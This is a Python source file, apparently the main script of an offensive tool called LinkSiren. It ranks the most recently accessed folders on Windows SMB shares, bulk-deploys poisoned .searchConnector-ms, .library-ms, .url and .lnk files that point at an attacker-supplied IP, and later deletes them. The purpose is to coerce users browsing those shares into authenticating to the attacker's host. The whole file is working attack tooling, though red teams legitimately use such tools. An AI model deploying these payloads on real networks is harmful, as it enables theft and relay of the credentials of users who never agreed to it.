"""
Author: George Hamilton
Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
"""
import json
import argparse
from datetime import datetime
from pathlib import Path
from smbclient import ClientConfig
from linksiren.impure_functions import read_targets, get_sorted_rankings, write_payload_remote, write_payload_local, delete_payload, write_list_to_file, get_lnk_template
from linksiren.pure_functions import filter_targets, is_valid_payload_name, create_lnk_payload, compute_threshold_date

def main():
    """
    main()

    Main function for command line usage.
    """
    # Parse script arguments
    parser = argparse.ArgumentParser(
        description='Identify and rate folders in shares based on access frequency, deploy '
                    'malicious URL files, and cleanup results.')

    # Modes
    subparsers = parser.add_subparsers(title='Modes', dest='mode')

    # Arguments for generating a payload locally
    generate_parser = subparsers.add_parser('generate', help='Output specified payload file'
                            'to the current directory instead of a remote location.')
    generate_required_group = generate_parser.add_argument_group('Required Arguments')
    generate_required_group.add_argument('-a', '--attacker', required=True,
                        help='Attacker IP or hostname to place in malicious URL')
    generate_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                        'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Arguments for outputting rankings of potential folders into which to place poisoned files
    rank_parser = subparsers.add_parser('rank', help='Output identified subfolders and rankings to folder_rankings.txt')
    rank_required_group = rank_parser.add_argument_group('Required Arguments')
    rank_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    rank_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    rank_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    rank_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to file shares / base '
                        'directories within which to rank folders as potential locations for placing'
                        ' poisoned files.')
    rank_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
                        'search within the target.')
    rank_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Number of days as an '
                        'integer for active files.')
    rank_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
                        ' soon as one active file in them is identified and move on. Ranks are '
                        'all set to 1 assigned.')

    # Arguments for identifying and outputting UNC paths to optimal folders into which to place poisoned files
    idenitfy_parser = subparsers.add_parser('identify', help='Identify target folders for payload distribution '
                                            'and output to folder_targets.txt')
    identify_required_group = idenitfy_parser.add_argument_group('Required Arguments')
    identify_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    identify_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    identify_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    identify_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to file shares / base '
                        'directories for deployment or from which to remove payload files')
    idenitfy_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
                        'search within the target')
    idenitfy_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Max number of days since '
                                 ' within which a file is considered active.')
    idenitfy_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
                        ' soon as one active file in them is identified and move on. Ranks are '
                        'all set to 1.')
    idenitfy_parser.add_argument('-mf', '--max-folders-per-target', type=int, default=10, help='(Default: 10) Maximum number of '
                            'folders to output as deployment targets per supplied target share or '
                            'folder.')

    # Arguments for deploying poisoned files to specified locations
    deploy_parser = subparsers.add_parser('deploy', help='Deploy payloads to all folder UNC '
                        'paths listed one per line in the file specified using --targets')
    deploy_required_group = deploy_parser.add_argument_group('Required Arguments')
    deploy_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    deploy_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    deploy_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    deploy_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to folders into which poisoned '
                         'files will be deployed.')
    deploy_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
                        'files.')
    deploy_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Arguments for cleaning up deployed payloads when finished
    cleanup_parser = subparsers.add_parser('cleanup', help='Delete poisoned files from folder UNC paths'
                                           'specified in --targets')
    cleanup_required_group = cleanup_parser.add_argument_group('Required Arguments')
    cleanup_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    cleanup_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    cleanup_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    cleanup_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to folders in which poisoned '
                         'files are located.')
    cleanup_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
                        'files.')
    cleanup_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Parse arguments
    args = parser.parse_args()

    available_extensions = ['.searchConnector-ms', '.library-ms', '.url', '.lnk']

    if args.mode == 'generate':
        # Validate the provided payload name and exit if it's invalid
        if not is_valid_payload_name(args.payload, available_extensions):
            return

        # Select a template file name based on the payload name
        payload_extension = Path(args.payload).suffix
        template_path = Path(__file__).parent / f'template.{payload_extension}'

        if payload_extension == '.lnk':
            lnk_template = get_lnk_template(template_path)
            payload_contents = create_lnk_payload(args.attacker, lnk_template)

        else:
            # Read the payload template contents into a file and substitute the connection string
            # to the attacker as appropriate.
            with open(template_path, 'r', encoding="utf-8") as template_file:
                payload_contents = template_file.read()
                payload_contents = payload_contents.format(attacker_ip=args.attacker)

        # Write payload to file in the current directory
        write_payload_local(args.payload, payload_contents)

    elif args.mode == 'rank': # If rank functionality is used to rank active folders
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
                                              args.fast)

        # Write all reviewed subfolders and their rankings to a file
        with open('folder_rankings', mode='w', encoding="utf-8") as f:
            f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))

    elif args.mode == 'identify':  # Else if identification functionality is used to identify active folders
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)

        sorted_rankings = get_sorted_rankings(targets, threshold_date, args.max_depth,
                                              args.fast)
        filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)

        # Write the highest ranked active shares to folder_targets.txt for review and deployment
        write_list_to_file(filtered_targets, 'folder_targets.txt')

    elif args.mode == 'deploy':  # Else if the deploy functionality is used to deploy payloads
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        payloads_written = []  # Track the UNC path of the folder to which each payload is written

        # Validate the provided payload name and exit if it's invalid
        if not is_valid_payload_name(args.payload, available_extensions):
            return

        # Select a template file name based on the payload name
        payload_extension = Path(args.payload).suffix
        template_path = Path(__file__).parent / f'template.{payload_extension}'

        if payload_extension == '.lnk':
            lnk_template = get_lnk_template(template_path)
            payload_contents = create_lnk_payload(args.attacker, lnk_template)

        else:
            # Read the payload template contents into a file and substitute the connection string
            # to the attacker as appropriate.
            with open(template_path, 'r', encoding="utf-8") as template_file:
                template_contents = template_file.read()
                payload_contents = template_contents.format(attacker_ip=args.attacker)

        # Iterate over each target folder path
        for folder_unc in targets:
            # Attempt to write a paylaod to each location
            write_successful = write_payload_remote(folder_unc, args.payload, payload_contents)
            if write_successful:
                payloads_written.append(folder_unc)

        # Save the list of payloads successfully written for easy cleanup
        write_list_to_file(payloads_written, 'payloads_written.txt', 'a')

    elif args.mode == 'cleanup':  # Else if the cleanup functionality is used to delete deployed payloads
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        # Iterate over each folder where payloads were deployed
        for payload_folder in targets:
            # Delete the payload at the specified path
            delete_payload(payload_folder, args.payload)

main()
